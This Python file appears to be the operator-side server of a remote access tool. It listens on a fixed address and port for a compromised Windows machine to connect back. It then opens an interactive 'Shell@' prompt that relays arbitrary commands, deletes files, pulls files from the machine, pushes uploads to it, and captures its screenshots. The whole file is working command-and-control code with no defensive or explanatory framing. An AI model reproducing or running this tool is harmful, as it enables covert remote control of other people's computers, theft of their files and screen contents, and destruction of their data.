# import modules
from socket import socket, AF_INET, SOCK_STREAM, error
from os import system, path
from time import sleep
from file import Recv, Send, Recv_ScreenShot

class Connection:
    def __init__(self):
        # Variables
        self.send_only = ("explorer", "explorer.", "winver", "msconfig",
        "regedit", "gpedit", "msinfo32", "services.msc", "diskmgmt.msc",
        "shutdown", "logout", "restart", "reboot")
        self.error_tuple = ("cd.", "", "services", "diskmgmt", "cd", "cd...", "cd....")
        self.IPAddr = "192.168.1.4"
        self.Port = 3333
        self.encoding = "utf-8"
        self.size = 10240000
        # Create Connection
        self.create_connection()
        # Start Server
        print("[*] Server Starting...")
        self.start()

    def start(self):
        self.server.listen()
        print("[*] Listening To {}:{}\n".format(self.IPAddr, self.Port))
        self.connection, self.address = self.server.accept()
        self.client()

    def create_connection(self):
        self.server = socket(AF_INET, SOCK_STREAM)
        self.server.bind((self.IPAddr, self.Port))

    def client(self):
        while True:
            try:
                self.command = input("Shell@{}~# ".format(self.address[0]))
                self.clean_command = self.command.replace(" ", "").lower()
                if self.clean_command == "cd..":
                    self.send(self.clean_command)
                elif self.clean_command == "conn-addr":
                    print(self.address)
                elif self.command[:3] == "cd " and self.clean_command[-1] != ":":
                    self.clean_command = "{}".format(self.command.replace("\\", "/"))
                    self.send(self.clean_command)
                elif self.command[:3] == "cd " and self.clean_command[-1] == ":":
                    self.send(self.command)
                elif self.clean_command == "pwd":
                    self.send(self.clean_command)
                    self.read("\n", "\n")
                elif self.clean_command == "list-part":
                    self.send(self.clean_command)
                    self.read("\n", "\n")
                elif self.clean_command in self.send_only:
                    self.send(self.clean_command)
                elif int(len(self.clean_command)) == 2 and self.clean_command[-1] == ":":
                    self.send(self.clean_command)
                elif self.clean_command == "ls":
                    self.send(self.clean_command)
                    self.read("\n", "\n")
                elif self.clean_command[:4] in ("echo", "open", "call"):
                    self.send(self.command)
                elif self.clean_command[:4] == "cd.>":
                    self.send(self.command)
                elif self.clean_command[:3] == "del":
                    self.send(self.command)
                elif self.clean_command[:2] == "md":
                    self.send(self.command)
                elif self.clean_command[:5] in ("rmdir", "start", "mkdir"):
                    self.send(self.command)
                elif self.clean_command[:6] in ("attrib", "rename"):
                    self.send(self.command)
                elif self.clean_command.replace(" ", "") in ("cls", "clear"):
                    system("cls")
                elif self.command[:9] == "download ":
                    self.send(self.command)
                    try:
                        Recv(self.connection, self.clean_command[8:], self.size)
                    except:
                        continue
                elif self.command[:7] == "upload ":
                    file_name = self.clean_command[6:]
                    if path.exists(f"../upload/{file_name}"):
                        self.send(self.command)
                        try:
                            Send(self.connection, f"../upload/{file_name}")
                        except:
                            continue
                    else:
                        continue
                elif self.clean_command == "screenshot":
                    self.send(self.clean_command)
                    Recv_ScreenShot(self.connection, self.size)
                else:
                    if self.clean_command.replace(" ", "") in self.error_tuple:
                        print("Invalid Command")
                    else:
                        self.send(self.command)
                        self.read("\n", "")
            except error as err:
                print("\n{}\n".format(err))
                sleep(3)
                system("cls")
                self.connection.close()
                self.create_connection()
                print("[*] Server Starting...")
                self.start()

    def send(self, msg: str):
            self.connection.send(msg.encode())

    def read(self, before: str, after: str):
        self.recevied = self.connection.recv(self.size).decode() 
        print("{}{}{}".format(before, self.recevied, after))

Connection()
